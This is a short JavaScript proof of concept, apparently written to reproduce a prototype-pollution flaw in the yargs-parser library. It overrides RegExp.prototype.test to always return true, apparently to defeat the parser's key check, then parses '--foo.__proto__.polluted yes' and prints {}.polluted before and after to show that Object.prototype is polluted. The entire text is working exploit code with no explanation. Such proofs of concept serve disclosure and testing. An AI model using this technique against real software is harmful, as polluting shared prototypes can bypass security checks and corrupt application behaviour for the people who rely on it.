RegExp.prototype.test = () => true;
console.log({}.polluted);
const parser = require('yargs-parser');
parser('--foo.__proto__.polluted yes');
console.log({}.polluted);